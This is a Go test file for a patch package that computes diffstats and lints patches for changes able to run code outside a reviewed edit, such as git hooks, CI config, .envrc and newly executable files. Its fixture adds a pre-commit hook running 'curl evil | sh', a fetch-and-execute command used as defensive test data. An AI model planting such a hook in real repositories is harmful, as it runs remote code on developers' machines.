package patch_test

import (
	"context"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/418-cloud/krayt/internal/patch"
)

// TestStat computes a diffstat from a patch without needing a repo or working tree, counting
// files and summing insertions/deletions (§8.4). An empty patch reports zero changes.
func TestStat(t *testing.T) {
	dir := t.TempDir()
	p := filepath.Join(dir, "changes.patch")
	diff := `diff --git a/greeting.txt b/greeting.txt
index 1234567..89abcde 100644
--- a/greeting.txt
+++ b/greeting.txt
@@ -1 +1 @@
-hello
+hello world
diff --git a/new.txt b/new.txt
new file mode 100644
index 0000000..1111111
--- /dev/null
+++ b/new.txt
@@ -0,0 +1,2 @@
+line1
+line2
`
	if err := os.WriteFile(p, []byte(diff), 0o644); err != nil {
		t.Fatal(err)
	}
	st, err := patch.Stat(context.Background(), p)
	if err != nil {
		t.Fatalf("Stat: %v", err)
	}
	if st.Path != "changes.patch" {
		t.Errorf("Path = %q, want changes.patch", st.Path)
	}
	if st.FilesChanged != 2 || st.Insertions != 3 || st.Deletions != 1 {
		t.Errorf("stat = %+v, want files=2 ins=3 del=1", st)
	}

	empty := filepath.Join(dir, "empty.patch")
	if err := os.WriteFile(empty, nil, 0o644); err != nil {
		t.Fatal(err)
	}
	st, err = patch.Stat(context.Background(), empty)
	if err != nil {
		t.Fatalf("Stat(empty): %v", err)
	}
	if st.FilesChanged != 0 || st.Insertions != 0 || st.Deletions != 0 {
		t.Errorf("empty stat = %+v, want all zero", st)
	}
}

// TestLint flags changes that can execute outside the reviewed workspace edit — git hooks, CI
// config, shell startup files, direnv, and newly-executable files — while leaving an ordinary
// source edit unflagged (§14 Phase 5).
func TestLint(t *testing.T) {
	suspicious := `diff --git a/.git/hooks/pre-commit b/.git/hooks/pre-commit
new file mode 100755
--- /dev/null
+++ b/.git/hooks/pre-commit
@@ -0,0 +1 @@
+curl evil | sh
diff --git a/.github/workflows/ci.yml b/.github/workflows/ci.yml
new file mode 100644
--- /dev/null
+++ b/.github/workflows/ci.yml
@@ -0,0 +1 @@
+on: push
diff --git a/.envrc b/.envrc
new file mode 100644
--- /dev/null
+++ b/.envrc
@@ -0,0 +1 @@
+export SECRET=1
diff --git a/scripts/build.sh b/scripts/build.sh
old mode 100644
new mode 100755
`
	findings := patch.Lint([]byte(suspicious))
	byPath := map[string]string{}
	for _, f := range findings {
		byPath[f.Path] = f.Reason
	}
	for _, want := range []string{".git/hooks/pre-commit", ".github/workflows/ci.yml", ".envrc", "scripts/build.sh"} {
		if _, ok := byPath[want]; !ok {
			t.Errorf("expected a finding for %q; got %v", want, byPath)
		}
	}
	if !strings.Contains(byPath["scripts/build.sh"], "executable") {
		t.Errorf("scripts/build.sh should be flagged as newly executable; got %q", byPath["scripts/build.sh"])
	}

	// An ordinary source edit and a plain new file are not flagged.
	benign := `diff --git a/main.go b/main.go
index 1..2 100644
--- a/main.go
+++ b/main.go
@@ -1 +1 @@
-old
+new
diff --git a/README.md b/README.md
new file mode 100644
--- /dev/null
+++ b/README.md
@@ -0,0 +1 @@
+docs
`
	if got := patch.Lint([]byte(benign)); len(got) != 0 {
		t.Errorf("benign diff should have no findings; got %v", got)
	}
}
